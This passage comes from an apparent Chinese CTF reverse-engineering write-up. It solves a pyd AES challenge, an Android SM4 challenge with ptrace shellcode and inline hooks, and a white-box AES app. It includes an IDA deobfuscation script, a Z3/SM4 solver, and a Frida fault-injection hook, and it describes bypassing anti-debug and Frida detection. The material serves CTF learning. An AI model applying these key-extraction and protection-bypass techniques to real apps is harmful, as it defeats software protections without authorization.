02 0A 73 8C</span></span><br><span class="line"><span class="string">B6 1D 52 98 A6 A8 A0 6D 65 1E 3F 6B 13 70 F3 DE</span></span><br><span class="line"><span class="string">11 7F 2D 3F D6 2A 91 F1 2D 7B 5F A8 BD 54 0D 6F</span></span><br><span class="line"><span class="string">F1 1B EB 34 8D 95 0E D0 32 4A 52 41 1A 00 E3 CB</span></span><br><span class="line"><span class="string">82 53 31 56 56 E3 2F 10 13 C6 ED 2D B6 BC 74 40</span></span><br><span class="line"><span class="string">A5 83 74 B0 06 99 68 9D 10 BE 30 72 00 1C E9 91</span></span><br><span class="line"><span class="string">55 04 23 8B 42 81 B2 17 47 C0 51 D3 70 5E 39 7A</span></span><br><span class="line"><span class="string">91 BF CD 44 AE FA 25 C5 65 9E A6 B2 84 B9 9A BF</span></span><br><span class="line"><span class="string">7D 14 CC 2B C4 B8 79 78 B0 0F 73 F6 53 EC EC DD</span></span><br><span class="line"><span class="string">BB BD CF A6 24 A4 EA BF 49 C1 DA F5 D5 21 52 08</span></span><br><span class="line"><span class="string">7B FD 6D 4A 0E 6A B4 6A 9A E0 14 EF C5 52 66 98</span></span><br><span class="line"><span class="string">C0 1C FE 15 1E 19 08 8D A3 1B 13 C3 DB 78 39 C3</span></span><br><span class="line"><span class="string">03 BF F3 70 28 25 6E 4A 17 D6 4B 97 FA 41 9E DE</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext_hex = ciphertext_hex.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line">key = <span class="string">b&quot;xianyu_jsonmusic&quot;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">decrypted = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    plaintext = unpad(decrypted, AES.block_size)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密成功（自动移除填充）:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))  </span><br></pre></td></tr></table></figure></div>

<p><strong>主动调用法</strong></p>
<p>对于这类的pyd题目，比较取巧的一类做法就是主动去调用pyd库文件，有时候输出结果可能就是我们需要的重要信息。根据上面的步骤2我们确定了我们要获取到meta的信息。那么我们重写一个python文件，import上pyd库，再执行调用。</p>
<p>脚本如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xianyu_decrypt <span class="keyword">import</span> load_and_decrypt_xianyu</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">result = load_and_decrypt_xianyu(<span class="string">r&quot;C:\路径\miao.xianyu&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360107/1748348014855-37ff923c-2fae-4830-9883-86a89d632542.png"
                      alt="img"
                ></p>
<p>得到flag</p>
<p>DASCTF{fl5h_mus1c_miao_m1a0_mlaO}</p>
<h2 id="题目-xuans"><a href="#题目-xuans" class="headerlink" title="题目-xuans"></a>题目-xuans</h2><p>知识点</p>
<ol>
<li><strong>反调试</strong></li>
<li><strong>Inline HOOK</strong></li>
<li><strong>ptrace注入</strong></li>
<li><strong>SM4</strong></li>
</ol>
<p>解题步骤</p>
<ol>
<li><strong>反调试</strong></li>
</ol>
<p>init_array中调用pthread_create创建了一个检测函数检测TracerPid</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748355574664-ab71a6b9-de7b-446a-ac10-61620831f69b.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748355665113-9b4ed67f-50de-47cf-8a9f-74a3109af264.png"
                      alt="img"
                ><strong>2. 分析加密算法</strong></p>
<p>标准的SM4&#x2F;ECB加密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748498245996-b367531a-88d3-494a-bf8a-ad07c752fb82.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748424273132-d55ddd31-f277-49b0-89ef-21eca3b20b9a.png"
                      alt="img"
                ></p>
<ol>
<li><strong>拿SM4密钥</strong></li>
</ol>
<p>ptrace注入了一段shellcode动态解密SM4密钥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748498673389-30151059-df61-4cac-b84e-34657c3f6a22.png"
                      alt="img"
                ></p>
<p>将shellcode提取出来看到一段异或</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v5[<span class="number">0</span>] = 0xE87D8948E5894855LL;</span><br><span class="line">v5[<span class="number">1</span>] = 0xEB0000000FFC45C7LL;</span><br><span class="line">v5[<span class="number">2</span>] = 0x48D06348FC458B3ALL;</span><br><span class="line">v5[<span class="number">3</span>] = 0xB60FD00148E8458BLL;</span><br><span class="line">v5[<span class="number">4</span>] = 0x8D489848FC458B30LL;</span><br><span class="line">v5[<span class="number">5</span>] = 0x148E8458B48FF50LL;</span><br><span class="line">v5[<span class="number">6</span>] = 0x48FC458B08B60FD0LL;</span><br><span class="line">v5[<span class="number">7</span>] = 0x148E8458B48D063LL;</span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">0x83</span>1088F289CE31D0LL;</span><br><span class="line">v6[<span class="number">0</span>] = 0x7F00FC7D8301FC6DLL;</span><br><span class="line">*(v6 + <span class="number">7</span>) = 0xC35D9090C07FLL;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748356212185-6a02a44c-5a90-4c34-8183-450de7f9604c.png"
                      alt="img"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x39</span>,<span class="number">0x5A</span>,<span class="number">0x3B</span>,<span class="number">0x5D</span>,<span class="number">0x3C</span>,<span class="number">0xA</span>,<span class="number">0x3E</span>,<span class="number">0x8</span>,<span class="number">0x3E</span>,<span class="number">0x5F</span>,<span class="number">0x6F</span>,<span class="number">0x5D</span>,<span class="number">0x65</span>,<span class="number">0x7</span>,<span class="number">0x61</span>,<span class="number">0x3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    enc[i] ^= enc[i - <span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> enc))</span><br><span class="line">    </span><br></pre></td></tr></table></figure></div>

<p>memcmp校验的密文是FakeFlag<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748498729091-9b89c88c-db7f-43c6-af8d-1edd45f6e1ab.png"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748420351720-9205b4e8-7d49-4796-8ab6-667d56baf82e.png"
                      alt="img"
                ></p>
<ol>
<li><strong>找到hook函数</strong></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748498762354-48d55eda-ca97-4bfb-9943-00e72d67261e.png"
                      alt="img"
                ></p>
<p>在构造跳转指令的函数中找到hook的函数地址。(0x4019A0 + 5) &#x3D; 0x4019A5 。解一个Z3拿到SM4密文</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748498775243-e598363a-d17d-4ccf-bfd1-60a339cf1c77.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748498808967-51cd19a5-153f-435b-8018-24c9110849f5.png"
                      alt="img"
                ></p>
<ol>
<li><strong>解出FLAG</strong></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360297/1748412077135-24dcc338-390b-4ba3-ab17-f6ca10e8e0ed.png"
                      alt="img"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl.sm4 <span class="keyword">import</span> CryptSM4, SM4_DECRYPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    enc = [<span class="number">0x39</span>,<span class="number">0x5A</span>,<span class="number">0x3B</span>,<span class="number">0x5D</span>,<span class="number">0x3C</span>,<span class="number">0xA</span>,<span class="number">0x3E</span>,<span class="number">0x8</span>,<span class="number">0x3E</span>,<span class="number">0x5F</span>,<span class="number">0x6F</span>,<span class="number">0x5D</span>,<span class="number">0x65</span>,<span class="number">0x7</span>,<span class="number">0x61</span>,<span class="number">0x3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">        enc[i] ^= enc[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> enc)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    a1 = [BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">173</span>*a1[<span class="number">0</span>] + <span class="number">48</span>*a1[<span class="number">1</span>] + <span class="number">118</span>*a1[<span class="number">2</span>] + <span class="number">193</span>*a1[<span class="number">3</span>] == <span class="number">66131</span>)</span><br><span class="line">    solver.add(<span class="number">68</span>*a1[<span class="number">0</span>] + <span class="number">196</span>*a1[<span class="number">1</span>] + <span class="number">104</span>*a1[<span class="number">2</span>] + <span class="number">10</span>*a1[<span class="number">3</span>] == <span class="number">52620</span>)</span><br><span class="line">    solver.add(<span class="number">22</span>*a1[<span class="number">0</span>] + <span class="number">37</span>*a1[<span class="number">1</span>] + <span class="number">88</span>*a1[<span class="number">2</span>] + <span class="number">71</span>*a1[<span class="number">3</span>] == <span class="number">36011</span>)</span><br><span class="line">    solver.add(<span class="number">89</span>*a1[<span class="number">0</span>] + <span class="number">141</span>*a1[<span class="number">1</span>] + <span class="number">59</span>*a1[<span class="number">2</span>] + <span class="number">194</span>*a1[<span class="number">3</span>] == <span class="number">61842</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">40</span>*a1[<span class="number">4</span>] + <span class="number">88</span>*a1[<span class="number">5</span>] + <span class="number">175</span>*a1[<span class="number">6</span>] + <span class="number">89</span>*a1[<span class="number">7</span>] == <span class="number">65258</span>)</span><br><span class="line">    solver.add(<span class="number">82</span>*a1[<span class="number">4</span>] + <span class="number">166</span>*a1[<span class="number">5</span>] + <span class="number">26</span>*a1[<span class="number">6</span>] + <span class="number">78</span>*a1[<span class="number">7</span>] == <span class="number">58176</span>)</span><br><span class="line">    solver.add(<span class="number">73</span>*a1[<span class="number">4</span>] + <span class="number">10</span>*a1[<span class="number">5</span>] + <span class="number">149</span>*a1[<span class="number">6</span>] + <span class="number">116</span>*a1[<span class="number">7</span>] == <span class="number">62478</span>)</span><br><span class="line">    solver.add(<span class="number">198</span>*a1[<span class="number">4</span>] + <span class="number">80</span>*a1[<span class="number">5</span>] + <span class="number">176</span>*a1[<span class="number">6</span>] + <span class="number">193</span>*a1[<span class="number">7</span>] == <span class="number">114069</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">83</span>*a1[<span class="number">8</span>] + <span class="number">100</span>*a1[<span class="number">9</span>] + <span class="number">178</span>*a1[<span class="number">10</span>] + <span class="number">30</span>*a1[<span class="number">11</span>] == <span class="number">56170</span>)</span><br><span class="line">    solver.add(<span class="number">148</span>*a1[<span class="number">8</span>] + <span class="number">148</span>*a1[<span class="number">9</span>] + <span class="number">143</span>*a1[<span class="number">10</span>] + <span class="number">168</span>*a1[<span class="number">11</span>] == <span class="number">70647</span>)</span><br><span class="line">    solver.add(<span class="number">33</span>*a1[<span class="number">8</span>] + <span class="number">194</span>*a1[<span class="number">9</span>] + <span class="number">10</span>*a1[<span class="number">10</span>] + <span class="number">186</span>*a1[<span class="number">11</span>] == <span class="number">53174</span>)</span><br><span class="line">    solver.add(<span class="number">128</span>*a1[<span class="number">8</span>] + <span class="number">33</span>*a1[<span class="number">9</span>] + <span class="number">32</span>*a1[<span class="number">10</span>] + <span class="number">152</span>*a1[<span class="number">11</span>] == <span class="number">26118</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">164</span>*a1[<span class="number">12</span>] + <span class="number">115</span>*a1[<span class="number">13</span>] + <span class="number">184</span>*a1[<span class="number">14</span>] + <span class="number">29</span>*a1[<span class="number">15</span>] == <span class="number">81254</span>)</span><br><span class="line">    solver.add(<span class="number">35</span>*a1[<span class="number">12</span>] + <span class="number">129</span>*a1[<span class="number">13</span>] + <span class="number">129</span>*a1[<span class="number">14</span>] + <span class="number">165</span>*a1[<span class="number">15</span>] == <span class="number">78646</span>)</span><br><span class="line">    solver.add(<span class="number">54</span>*a1[<span class="number">12</span>] + <span class="number">134</span>*a1[<span class="number">13</span>] + <span class="number">39</span>*a1[<span class="number">14</span>] + <span class="number">18</span>*a1[<span class="number">15</span>] == <span class="number">29827</span>)</span><br><span class="line">    solver.add(<span class="number">80</span>*a1[<span class="number">12</span>] + <span class="number">133</span>*a1[<span class="number">13</span>] + <span class="number">106</span>*a1[<span class="number">14</span>] + <span class="number">43</span>*a1[<span class="number">15</span>] == <span class="number">53660</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">187</span>*a1[<span class="number">16</span>] + <span class="number">32</span>*a1[<span class="number">17</span>] + <span class="number">121</span>*a1[<span class="number">18</span>] + <span class="number">2</span>*a1[<span class="number">19</span>] == <span class="number">24667</span>)</span><br><span class="line">    solver.add(<span class="number">66</span>*a1[<span class="number">16</span>] + <span class="number">170</span>*a1[<span class="number">17</span>] + <span class="number">58</span>*a1[<span class="number">18</span>] + <span class="number">36</span>*a1[<span class="number">19</span>] == <span class="number">44188</span>)</span><br><span class="line">    solver.add(<span class="number">103</span>*a1[<span class="number">16</span>] + <span class="number">120</span>*a1[<span class="number">17</span>] + <span class="number">12</span>*a1[<span class="number">18</span>] + <span class="number">175</span>*a1[<span class="number">19</span>] == <span class="number">52310</span>)</span><br><span class="line">    solver.add(<span class="number">83</span>*a1[<span class="number">16</span>] + <span class="number">92</span>*a1[<span class="number">17</span>] + <span class="number">129</span>*a1[<span class="number">18</span>] + <span class="number">143</span>*a1[<span class="number">19</span>] == <span class="number">46020</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">100</span>*a1[<span class="number">20</span>] + <span class="number">54</span>*a1[<span class="number">21</span>] + <span class="number">141</span>*a1[<span class="number">22</span>] + <span class="number">122</span>*a1[<span class="number">23</span>] == <span class="number">66732</span>)</span><br><span class="line">    solver.add(<span class="number">171</span>*a1[<span class="number">20</span>] + <span class="number">85</span>*a1[<span class="number">21</span>] + <span class="number">69</span>*a1[<span class="number">22</span>] + <span class="number">7</span>*a1[<span class="number">23</span>] == <span class="number">46817</span>)</span><br><span class="line">    solver.add(<span class="number">197</span>*a1[<span class="number">20</span>] + <span class="number">48</span>*a1[<span class="number">21</span>] + <span class="number">128</span>*a1[<span class="number">22</span>] + <span class="number">132</span>*a1[<span class="number">23</span>] == <span class="number">83536</span>)</span><br><span class="line">    solver.add(<span class="number">101</span>*a1[<span class="number">20</span>] + <span class="number">181</span>*a1[<span class="number">21</span>] + <span class="number">79</span>*a1[<span class="number">22</span>] + <span class="number">144</span>*a1[<span class="number">23</span>] == <span class="number">80587</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">149</span>*a1[<span class="number">24</span>] + <span class="number">187</span>*a1[<span class="number">25</span>] + <span class="number">24</span>*a1[<span class="number">26</span>] + <span class="number">142</span>*a1[<span class="number">27</span>] == <span class="number">92687</span>)</span><br><span class="line">    solver.add(<span class="number">118</span>*a1[<span class="number">24</span>] + <span class="number">86</span>*a1[<span class="number">25</span>] + <span class="number">49</span>*a1[<span class="number">26</span>] + <span class="number">50</span>*a1[<span class="number">27</span>] == <span class="number">49285</span>)</span><br><span class="line">    solver.add(<span class="number">70</span>*a1[<span class="number">24</span>] + <span class="number">170</span>*a1[<span class="number">25</span>] + <span class="number">164</span>*a1[<span class="number">26</span>] + <span class="number">193</span>*a1[<span class="number">27</span>] == <span class="number">92711</span>)</span><br><span class="line">    solver.add(<span class="number">96</span>*a1[<span class="number">24</span>] + <span class="number">198</span>*a1[<span class="number">25</span>] + <span class="number">95</span>*a1[<span class="number">26</span>] + <span class="number">1</span>*a1[<span class="number">27</span>] == <span class="number">61904</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">114</span>*a1[<span class="number">28</span>] + <span class="number">179</span>*a1[<span class="number">29</span>] + <span class="number">37</span>*a1[<span class="number">30</span>] + <span class="number">163</span>*a1[<span class="number">31</span>] == <span class="number">53864</span>)</span><br><span class="line">    solver.add(<span class="number">49</span>*a1[<span class="number">28</span>] + <span class="number">94</span>*a1[<span class="number">29</span>] + <span class="number">132</span>*a1[<span class="number">30</span>] + <span class="number">99</span>*a1[<span class="number">31</span>] == <span class="number">36980</span>)</span><br><span class="line">    solver.add(<span class="number">43</span>*a1[<span class="number">28</span>] + <span class="number">113</span>*a1[<span class="number">29</span>] + <span class="number">150</span>*a1[<span class="number">30</span>] + <span class="number">128</span>*a1[<span class="number">31</span>] == <span class="number">40829</span>)</span><br><span class="line">    solver.add(<span class="number">1</span>*a1[<span class="number">28</span>] + <span class="number">139</span>*a1[<span class="number">29</span>] + <span class="number">115</span>*a1[<span class="number">30</span>] + <span class="number">44</span>*a1[<span class="number">31</span>] == <span class="number">22448</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        m = solver.model()</span><br><span class="line">        cipher_text = [m[a1[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">        <span class="comment">#print(bytes(cipher_text).hex())</span></span><br><span class="line">        crypt_sm4 = CryptSM4(padding_mode=<span class="literal">None</span>)</span><br><span class="line">        crypt_sm4.set_key(key.encode(), SM4_DECRYPT)</span><br><span class="line">        flag = crypt_sm4.crypt_ecb(<span class="built_in">bytes</span>(cipher_text))</span><br><span class="line">        <span class="keyword">return</span> flag.decode()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure></div>



<h2 id="题目-更适合CTF宝宝体质的app"><a href="#题目-更适合CTF宝宝体质的app" class="headerlink" title="题目-更适合CTF宝宝体质的app"></a>题目-更适合CTF宝宝体质的app</h2><p><strong>知识点</strong></p>
<p>frida检测</p>
<p>白盒AES</p>
<p>CRC32</p>
<p>间接跳转</p>
<p><strong>解题过程</strong></p>
<p>可以说是非常常规的CTF类型的题目，Java层没什么好看的，就个获取输入然后传入native层check</p>
<p>首先是打开时的间接跳转。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688027144-a7b55513-9e0e-452e-afae-091926d20dec.png"
                      alt="img"
                ></p>
<p>插了不少个，所以建议python脚本去除，现在不同往日，基本把汇编上的这块间接跳转喂给AI基本就能跑出来脚本，给个示例。匹配特征字节去除即可</p>
<div class="highlight-container" data-rel="Cmake"><figure class="iseeu highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import ida_bytes</span><br><span class="line">import ida_segment</span><br><span class="line">import idautils</span><br><span class="line"></span><br><span class="line">def remove_patterns():</span><br><span class="line">    patterns = [</span><br><span class="line">        [<span class="number">0</span>x00, <span class="number">0</span>x01, <span class="number">0</span>x1F, <span class="number">0</span>xD6],</span><br><span class="line">        [<span class="number">0</span>x61, <span class="number">0</span>x14, <span class="number">0</span>x91, <span class="number">0</span>xF0]</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for seg_ea in idautils.Segments():</span><br><span class="line">        seg = ida_segment.getseg(seg_ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seg:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        for pattern in patterns:</span><br><span class="line">            ea = seg.start_ea</span><br><span class="line">            <span class="keyword">while</span> ea &lt; seg.end_ea - len(pattern) + <span class="number">1</span>:</span><br><span class="line">                match = <span class="keyword">True</span></span><br><span class="line">                for i, byte_val in enumerate(pattern):</span><br><span class="line">                    <span class="keyword">if</span> ida_bytes.get_byte(ea + i) != byte_val:</span><br><span class="line">                        match = <span class="keyword">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> match:</span><br><span class="line">                    pattern_len =<span class="number">20</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 用4字节NOP填充整个模式区域</span></span><br><span class="line">                    for i in range(<span class="number">0</span>, pattern_len, <span class="number">4</span>):</span><br><span class="line">                        ida_bytes.patch_dword(ea + i, <span class="number">0</span>xd503201f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    ea += pattern_len</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ea += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">remove_patterns()</span><br></pre></td></tr></table></figure></div>

<p>动态注册的函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688190173-9d51e7a2-1799-420a-9f32-48dbcebbc481.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688200733-dac4ce3e-7185-4be5-b7eb-2d971e18c9d8.png"
                      alt="img"
                ></p>
<p>找到主要代码部分</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688218010-f4c64668-1175-4d9a-b63f-5dccd082fdde.png"
                      alt="img"
                ></p>
<p>第一个函数是很明显的AES</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688238639-91d329f7-ee4a-46e9-9fd1-1c0dcf25f3f4.png"
                      alt="img"
                ></p>
<p>根据很大的索引以及不正常的加密步骤应该可以看得出来这是白盒AES，解密方式就是，先获取密钥</p>
<p>在n&#x3D;&#x3D;8时改变此时的十六字节中的一个就能获取一份加密错误的密文，相应操作获取大约十组以上的密文就可以通过差分攻击获取密钥，网上有很多文章，这里不多介绍了。</p>
<p>一般选用frida直接hook操作，init.array中有简单的frida反调试，nop过掉即可，检测力度很低，稍微魔改下的frida都不会被检测到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/39289695/1750688497573-d028dba8-1b60-48c1-9be3-cbe5dccb0145.png"
                      alt="img"
                ></p>
<p>w8和下方传给X0的指针就是相应的轮次和指向正在加密的明文</p>
<p>脚本写完后丢失了不过这块很简单的就展示个我之前写的另一道白盒AES的示例好了，我没记错的根据w8等于8为判断点，然后修改x0为基地址偏移的字节就可以了。</p>
<div class="highlight-container" data-rel="Cmake"><figure class="iseeu highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> hook_native()&#123;</span><br><span class="line">    const moduleName = <span class="string">&quot;xxxxx.so&quot;</span>;</span><br><span class="line">    const so = Process.findModuleByName(moduleName);</span><br><span class="line">var a=<span class="number">0</span>;</span><br><span class="line">var flag=<span class="number">0</span>;</span><br><span class="line">    Interceptor.attach(so.base.add(<span class="number">0</span>x25E28),&#123;</span><br><span class="line">onEnter: <span class="keyword">function</span> (params) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(this.context[<span class="string">&quot;x23&quot;</span>]==<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var plainchar=this.context[<span class="string">&quot;x20&quot;</span>]</span><br><span class="line">        Memory.writeU8(plainchar.add(<span class="number">0</span>), <span class="number">0</span>x01);//指针add的值改<span class="number">16</span>次</span><br><span class="line">    &#125;</span><br><span class="line">      //bb f0 <span class="number">6</span>d <span class="number">95</span> a6 <span class="number">69</span> <span class="number">99</span> <span class="number">38</span> d2 <span class="number">40</span> <span class="number">4</span>b af <span class="number">5</span>e <span class="number">3</span>d <span class="number">7</span>f <span class="number">61</span></span><br><span class="line">      //b6 f0 <span class="number">6</span>d <span class="number">95</span> a6 <span class="number">69</span> <span class="number">99</span> <span class="number">6</span>f d2 <span class="number">40</span> a2 af <span class="number">5</span>e f1 <span class="number">7</span>f <span class="number">61</span>  </span><br><span 